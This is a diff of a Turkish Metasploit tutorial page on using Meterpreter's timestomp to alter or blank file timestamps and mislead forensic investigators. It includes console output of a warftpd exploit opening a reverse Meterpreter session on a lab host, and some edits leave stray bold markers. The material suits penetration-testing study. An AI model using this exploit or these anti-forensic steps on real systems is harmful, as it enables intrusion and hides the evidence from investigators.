@@ -22,7 +22,7 @@ tags:
 
 
 
-Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter `timestomp` adı verilen bir komut sağlamaktadır.
+Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter `timestomp` adı verilen bir komut sağlamaktadır.
 
 
 
@@ -50,19 +50,19 @@ Yukarıda, `test.txt` isimli dosyanın zaman kayıtlarını görebiliriz. Şimdi
 
 
 ```bash
-msf exploit**(**warftpd_165_user**)** > exploit
+msf exploit(warftpd_165_user) > exploit
 
 > Handler binding to LHOST 0.0.0.0
 > Started reverse handler
 > Connecting to FTP server 172.16.104.145:21...
 > Connected to target FTP server.
 > Trying target Windows 2000 SP0-SP4 English...
-> Transmitting intermediate stager **for **over-sized stage...**(**191 bytes**)**
-> Sending stage **(**2650 bytes**)**
+> Transmitting intermediate stager for **over-sized stage...(191 bytes)
+> Sending stage (2650 bytes)
 > Sleeping before handling stage...
-> Uploading DLL **(**75787 bytes**)**...
+> Uploading DLL (75787 bytes)...
 > Upload completed.
-> meterpreter session 1 opened **(**172.16.104.130:4444 -> 172.16.104.145:1218**)**
+> meterpreter session 1 opened (172.16.104.130:4444 -> 172.16.104.145:1218)
 meterpreter > use priv
 Loading extension priv...success.
 ```
@@ -88,7 +88,7 @@ OPTIONS:
     -m   Set the "last written" time of the file
     -r        Set the MACE timestamps recursively on a directory
     -v        Display the UTC MACE values of the file
-    -z   Set all four attributes **(**MACE**)** of the file
+    -z   Set all four attributes (MACE) of the file
 ```
 
 
@@ -283,7 +283,7 @@ meterpreter > ls
 
 
 
-Yukarıda anlatılan yöntemlerle zaman bilgilerini değiştirdik veya boş hale getirdik ancak dikkatli **forensics** araştırmacıları bu garipliği fark edecektir.
+Yukarıda anlatılan yöntemlerle zaman bilgilerini değiştirdik veya boş hale getirdik ancak dikkatli forensics** araştırmacıları bu garipliği fark edecektir.
 
 
 
@@ -291,7 +291,7 @@ Bunun yerine sistemin tamamının zaman bilgilerini değiştirmeyi düşünebili
 
 
 
-Bu durum, sisteme bir müdahale olduğunu açık olarak ortaya koymakla birlikte **forensics** araştırmacılarının işini zorlaştıracaktır.
+Bu durum, sisteme bir müdahale olduğunu açık olarak ortaya koymakla birlikte forensics** araştırmacılarının işini zorlaştıracaktır.
 
 
 
@@ -352,4 +352,4 @@ Mode              Size       Type  Last modified              Name
 
 
 
-Akıllı **forensics** araştırmacıları, sadece zaman bilgileri değil başka yerlere de bakarlar. Windows içinde çeşitli farklı kayıt mekanizmaları bulunmaktadır.
+Akıllı forensics** araştırmacıları, sadece zaman bilgileri değil başka yerlere de bakarlar. Windows içinde çeşitli farklı kayıt mekanizmaları bulunmaktadır.
